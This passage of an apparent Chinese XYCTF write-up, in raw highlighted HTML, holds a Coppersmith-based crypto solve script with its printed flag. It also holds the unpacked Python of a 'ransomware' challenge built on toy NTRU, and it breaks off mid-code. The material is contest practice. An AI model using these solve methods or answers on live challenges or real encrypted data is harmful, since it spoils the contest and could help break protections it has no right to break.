punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> Complex<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>re <span class=\"token operator\">&lt;&lt;</span> m<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>im <span class=\"token operator\">&lt;&lt;</span> m<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__str__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>im <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>re<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>re <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> <span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>im<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'-'</span> <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>im <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token keyword\">else</span> <span class=\"token string\">''</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">i\"</span></span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span>im<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">i\"</span></span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span>re<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'+'</span> <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>im <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token keyword\">else</span> <span class=\"token string\">'-'</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>im<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">i\"</span></span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">tolist</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span>self<span class=\"token punctuation\">.</span>re<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>im<span class=\"token punctuation\">]</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">complex_pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> exp<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    result <span class=\"token operator\">=</span> Complex<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">while</span> exp <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> exp <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n            result <span class=\"token operator\">=</span> result <span class=\"token operator\">*</span> c\n            result<span class=\"token punctuation\">.</span>re <span class=\"token operator\">=</span> result<span class=\"token punctuation\">.</span>re <span class=\"token operator\">%</span> n\n            result<span class=\"token punctuation\">.</span>im <span class=\"token operator\">=</span> result<span class=\"token punctuation\">.</span>im <span class=\"token operator\">%</span> n\n        c <span class=\"token operator\">=</span> c <span class=\"token operator\">*</span> c\n        c<span class=\"token punctuation\">.</span>re <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span>re <span class=\"token operator\">%</span> n\n        c<span class=\"token punctuation\">.</span>im <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span>im <span class=\"token operator\">%</span> n\n        exp <span class=\"token operator\">>></span><span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n    <span class=\"token keyword\">return</span> result\n\nn <span class=\"token operator\">=</span> <span class=\"token number\">24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span>\nmh <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552</span><span class=\"token punctuation\">]</span>\nC <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752</span><span class=\"token punctuation\">]</span>\nenc <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x9c\\xc4n\\x8dF\\xd9\\x9e\\xf4\\x05\\x82!\\xde\\xfe\\x012$\\xd0\\x8c\\xaf\\xfb\\rEb(\\x04)\\xa1\\xa6\\xbaI2J\\xd2\\xb2\\x898\\x11\\xe6x\\xa9\\x19\\x00pn\\xf6rs- \\xd2\\xd1\\xbe\\xc7\\xf51.\\xd4\\xd2 \\xe7\\xc6\\xca\\xe5\\x19\\xbe'</span>\n\nPR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token punctuation\">,</span>y<span class=\"token operator\">>=</span>Zmod<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\na<span class=\"token operator\">=</span>mh<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>x\nb<span class=\"token operator\">=</span>mh<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>y\nf1<span class=\"token operator\">=</span>a<span class=\"token operator\">^</span><span class=\"token number\">3</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token operator\">*</span>a<span class=\"token operator\">*</span>b<span class=\"token operator\">^</span><span class=\"token number\">2</span><span class=\"token operator\">-</span>C<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n\nroots<span class=\"token operator\">=</span>small_roots<span class=\"token punctuation\">(</span>f1<span class=\"token punctuation\">,</span>bounds<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">129</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>m<span class=\"token operator\">=</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>d<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>roots<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\nm<span class=\"token operator\">=</span>Complex<span class=\"token punctuation\">(</span>mh<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>roots<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>mh<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>roots<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span>re <span class=\"token operator\">+</span> m<span class=\"token punctuation\">.</span>im<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\ndec<span class=\"token operator\">=</span>ChaCha20<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token operator\">=</span>hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span>re <span class=\"token operator\">+</span> m<span class=\"token punctuation\">.</span>im<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> nonce<span class=\"token operator\">=</span><span class=\"token string\">b'Pr3d1ctmyxjj'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dec<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n\n<blockquote>\n<p>XYCTF{Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge}</p>\n</blockquote>\n<h3 id=\"勒索病毒\"><a href=\"#勒索病毒\" class=\"headerlink\" title=\"勒索病毒\"></a>勒索病毒</h3><p>题目给出了exe和加密的16进制数据</p>\n<p>pyinstxtractor反编译一下，编译task.pyc看到注释的代码</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> re\n<span class=\"token keyword\">import</span> base64\n<span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">from</span> gmssl <span class=\"token keyword\">import</span> sm4\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>Padding <span class=\"token keyword\">import</span> pad\n<span class=\"token keyword\">import</span> binascii\n<span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> shuffle<span class=\"token punctuation\">,</span> randrange\n\nN <span class=\"token operator\">=</span> <span class=\"token number\">49</span> \np <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\nq <span class=\"token operator\">=</span> <span class=\"token number\">128</span>  \nd <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\n<span class=\"token keyword\">assert</span> q <span class=\"token operator\">></span> <span class=\"token punctuation\">(</span><span class=\"token number\">6</span> <span class=\"token operator\">*</span> d <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> p\nR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">></span> <span class=\"token operator\">=</span> ZZ<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">generate_T</span><span class=\"token punctuation\">(</span>d1<span class=\"token punctuation\">,</span> d2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">assert</span> N <span class=\"token operator\">>=</span> d1 <span class=\"token operator\">+</span> d2\n    s <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> d1 <span class=\"token operator\">+</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> d2 <span class=\"token operator\">+</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>N <span class=\"token operator\">-</span> d1 <span class=\"token operator\">-</span> d2<span class=\"token punctuation\">)</span>\n    shuffle<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> R<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">invert_mod_prime</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    Rp <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>Integers<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>quotient<span class=\"token punctuation\">(</span>x<span class=\"token operator\">^</span>N <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> R<span class=\"token punctuation\">(</span>lift<span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">/</span> Rp<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">convolution</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>f <span class=\"token operator\">*</span> g<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>x<span class=\"token operator\">^</span>N <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">lift_mod</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> R<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> q <span class=\"token operator\">//</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> q<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> q <span class=\"token operator\">//</span> <span class=\"token number\">2</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">poly_mod</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> R<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>f<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">%</span> q <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">invert_mod_pow2</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">assert</span> q<span class=\"token punctuation\">.</span>is_power_of<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    g <span class=\"token operator\">=</span> invert_mod_prime<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        r <span class=\"token operator\">=</span> lift_mod<span class=\"token punctuation\">(</span>convolution<span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> r <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> g\n        g <span class=\"token operator\">=</span> lift_mod<span class=\"token punctuation\">(</span>convolution<span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span> <span class=\"token operator\">-</span> r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">generate_message</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> R<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>randrange<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">generate_key</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            f <span class=\"token operator\">=</span> generate_T<span class=\"token punctuation\">(</span>d <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">)</span>\n            g <span class=\"token operator\">=</span> generate_T<span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">)</span>\n            Fp <span class=\"token operator\">=</span> poly_mod<span class=\"token punctuation\">(</span>invert_mod_prime<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n            Fq <span class=\"token operator\">=</span> poly_mod<span class=\"token punctuation\">(</span>invert_mod_pow2<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">break</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">continue</span>\n    h <span class=\"token operator\">=</span> poly_mod<span class=\"token punctuation\">(</span>convolution<span class=\"token punctuation\">(</span>Fq<span class=\"token punctuation\">,</span> g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> h<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> g<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">encrypt_message</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    e <span class=\"token operator\">=</span> lift_mod<span class=\"token punctuation\">(</span>p <span class=\"token operator\">*</span> convolution<span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">,</span> generate_T<span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> m<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> e\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">save_ntru_keys</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    h<span class=\"token punctuation\">,</span> secret <span class=\"token operator\">=</span> generate_key<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pub_key.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"w\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    m <span class=\"token operator\">=</span> generate_message<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"priv_key.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"w\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    e <span class=\"token operator\">=</span> encrypt_message<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> h<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"enc.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"w\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">terms</span><span class=\"token punctuation\">(</span>poly_str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    terms <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    pattern <span class=\"token operator\">=</span> <span class=\"token string\">r'([+-]?\\s*x\\^?\\d*|[-+]?\\s*\\d+)'</span>\n    matches <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>finditer<span class=\"token punctuation\">(</span>pattern<span class=\"token punctuation\">,</span> poly_str<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token keyword\">match</span> <span class=\"token keyword\">in</span> matches<span class=\"token punctuation\">:</span>\n        term <span class=\"token operator\">=</span> <span class=\"token keyword\">match</span><span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> term <span class=\"token operator\">==</span> <span class=\"token string\">'+x'</span> <span class=\"token keyword\">or</span> term <span class=\"token operator\">==</span> <span class=\"token string\">'x'</span><span class=\"token punctuation\">:</span>\n            terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> term <span class=\"token operator\">==</span> <span class=\"token string\">'-x'</span><span class=\"token punctuation\">:</span>\n            terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> <span class=\"token string\">'x^'</span> <span class=\"token keyword\">in</span> term<span class=\"token punctuation\">:</span>\n            coeff_part <span class=\"token operator\">=</span> term<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'x^'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n            exponent <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>term<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'x^'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> coeff_part <span class=\"token keyword\">or</span> coeff_part <span class=\"token operator\">==</span> <span class=\"token string\">'+'</span><span class=\"token punctuation\">:</span>\n                coeff <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n            <span class=\"token keyword\">elif</span> coeff_part <span class=\"token operator\">==</span> <span class=\"token string\">'-'</span><span class=\"token punctuation\">:</span>\n                coeff <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                coeff <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>coeff_part<span class=\"token punctuation\">)</span>\n            terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>coeff <span class=\"token operator\">*</span> exponent<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> <span class=\"token string\">'x'</span> <span class=\"token keyword\">in</span> term<span class=\"token punctuation\">:</span>\n            coeff_part <span class=\"token operator\">=</span> term<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'x'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> coeff_part <span class=\"token keyword\">or</span> coeff_part <span class=\"token operator\">==</span> <span class=\"token string\">'+'</span><span class=\"token punctuation\">:</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">elif</span> coeff_part <span class=\"token operator\">==</span> <span class=\"token string\">'-'</span><span class=\"token punctuation\">:</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>coeff_part<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> term <span class=\"token operator\">==</span> <span class=\"token string\">'+1'</span> <span class=\"token keyword\">or</span> term <span class=\"token operator\">==</span> <span class=\"token 